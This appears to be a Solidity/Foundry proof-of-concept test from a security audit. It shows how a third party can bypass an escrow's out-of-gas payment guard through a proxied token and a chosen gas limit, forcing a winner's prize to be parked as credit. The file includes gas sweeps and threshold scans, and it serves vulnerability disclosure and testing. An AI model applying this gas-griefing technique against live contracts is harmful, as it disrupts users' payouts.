// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/Test.sol";
import {Escrow1v1} from "../../src/Escrow1v1.sol";
import {PocBase, DelegatingProxy, HungryImpl} from "./PocHelpers.sol";
import {GasHungryUSDC} from "../GasHungryUSDC.sol";

/// F-01. `_pay`'s out-of-gas heuristic (`gasleft() >= gasBefore / 63` after a
/// failed transfer) assumes an OOG inside the token leaves the escrow with
/// < 1/64 of its gas. That is only true when the OOG happens in the frame the
/// escrow called. USDC is a PROXY: the escrow calls FiatTokenProxy, which
/// DELEGATECALLs the implementation. If the implementation runs out of gas, the
/// proxy catches it and reverts with its own 1/64 unspent, which flows back to
/// the escrow: the escrow is left with ~2/64 (> 1/63) and the guard lets the
/// failure through as a "USDC rejection" -> a healthy winner is CREDITED
/// instead of paid, by any third party that calls the permissionless `settle`
/// with a hand-picked gas limit.
///
/// With today's FiatTokenV2_2 this is NOT reachable (see RealUsdcFork.t.sol):
/// the real transfer is cheap (<~45k), so 2/64 of it (~1.4k) can never pay for
/// the credit branch (SSTORE + event >= ~5k). The guard is saved by the cost of
/// the code after it, not by the check itself. It becomes reachable if the
/// token's transfer ever costs more than roughly 160k-800k gas (see
/// test_thresholdScan), e.g. after a USDC implementation upgrade.
contract PayGuardProxyBypassTest is PocBase {
    bytes32 constant ID = keccak256("poc-proxy");

    function setUp() public {
        _initClock();
    }

    function _deployProxied() internal returns (Escrow1v1 esc, HungryImpl tok) {
        HungryImpl impl = new HungryImpl();
        tok = HungryImpl(address(new DelegatingProxy(address(impl))));
        esc = new Escrow1v1(address(tok), arbiter, platform, FEE, owner);
        vm.prank(owner);
        esc.setAllowedStake(STAKE, true);
        _fundMatch(esc, address(tok), ID);
    }

    /// Sweep gas limits for a third-party `settle`. Counts runs where the winner
    /// (NOT blacklisted, NOT rejected by the token) ends up credited.
    function _sweep(Escrow1v1 esc, HungryImpl tok, uint256 from, uint256 to, uint256 step)
        internal
        returns (uint256 forced, uint256 paid, uint256 reverted)
    {
        uint64 dl = playDl + GRACE;
        bytes memory sig = _result(esc, ID, p1, dl);
        bytes memory data = abi.encodeCall(Escrow1v1.settle, (ID, p1, dl, sig));
        uint256 snap = vm.snapshotState();
        for (uint256 g = from; g <= to; g += step) {
            vm.revertToState(snap);
            vm.prank(address(0xBAD)); // anyone
            (bool ok,) = address(esc).call{gas: g}(data);
            if (!ok) {
                reverted++;
                continue;
            }
            if (esc.owed(p1) > 0) {
                forced++;
                assertEq(tok.balanceOf(p1), 0, "winner got nothing");
                assertEq(esc.owed(p1), 2 * STAKE - (2 * STAKE * FEE) / 10000, "prize parked as credit");
            } else {
                paid++;
            }
        }
        vm.revertToState(snap);
    }

    /// Control: the SAME gas-hungry token WITHOUT a proxy. The guard works
    /// (this is what the repo's own test_SettleWithTightGasNeverCreditsHealthyWinner checks).
    function test_control_noProxy_guardHolds() public {
        GasHungryUSDC tok = new GasHungryUSDC();
        Escrow1v1 esc = new Escrow1v1(address(tok), arbiter, platform, FEE, owner);
        vm.prank(owner);
        esc.setAllowedStake(STAKE, true);
        _fundMatch(esc, address(tok), ID);
        tok.setHungry(p1, 3_000_000);

        uint64 dl = playDl + GRACE;
        bytes memory data = abi.encodeCall(Escrow1v1.settle, (ID, p1, dl, _result(esc, ID, p1, dl)));
        uint256 snap = vm.snapshotState();
        uint256 forced;
        for (uint256 g = 200_000; g <= 3_400_000; g += 20_000) {
            vm.revertToState(snap);
            (bool ok,) = address(esc).call{gas: g}(data);
            if (ok && esc.owed(p1) > 0) forced++;
        }
        assertEq(forced, 0, "no proxy: guard holds");
    }

    /// The bypass: identical token logic behind a delegating proxy.
    function test_proxy_forcedCreditOfHealthyWinner() public {
        (Escrow1v1 esc, HungryImpl tok) = _deployProxied();
        tok.setHungry(p1, 3_000_000);

        (uint256 forced, uint256 paid, uint256 reverted) = _sweep(esc, tok, 200_000, 3_400_000, 20_000);
        console2.log("forced credits:", forced);
        console2.log("paid in full  :", paid);
        console2.log("reverted      :", reverted);
        assertGt(forced, 0, "guard bypassed: healthy winner credited instead of paid");
        assertGt(paid, 0, "with enough gas it pays");
    }

    /// How expensive must the token's transfer be for the bypass to open?
    /// (post-failure work in `settle` is ~25k with a fresh `owed` slot, ~5k with
    /// a warm non-zero one; the escrow keeps ~2/64 of what it forwarded.)
    function _scan(uint256 burn) internal returns (uint256 forced) {
        (Escrow1v1 esc, HungryImpl tok) = _deployProxied();
        tok.setHungry(p1, burn);
        // Only the band just below "enough gas to pay" matters.
        uint256 hi = burn * 11 / 10 + 150_000;
        (forced,,) = _sweep(esc, tok, hi - hi / 5, hi, 500);
        console2.log("transfer burn", burn, "-> forced credits:", forced);
    }

    function test_scan_100k_unreachable() public {
        assertEq(_scan(100_000), 0);
    }

    function test_scan_300k_unreachable() public {
        assertEq(_scan(300_000), 0);
    }

    function test_scan_500k() public {
        _scan(500_000);
    }

    function test_scan_700k() public {
        _scan(700_000);
    }

    function test_scan_900k_reachable() public {
        assertGt(_scan(900_000), 0);
    }
}
